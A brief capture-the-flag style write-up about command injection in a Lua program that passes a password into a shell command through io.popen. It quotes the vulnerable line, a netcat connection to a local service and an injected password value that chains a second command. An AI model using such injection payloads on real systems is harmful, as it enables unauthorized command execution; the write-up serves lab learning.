Command injection in Lua (scripting language)

the vunerable line is

prog = io.popen("echo "..pass.." | sha1sum", "r")

where the "pass" variable is concatenated into a shell command (echo) without any sanitazation. This line can be executed by io.popen function.

So we start listening:

nc 127.0.0.1 5151

And type the command instead of password

Password: ; getflag > /tmp/pwned
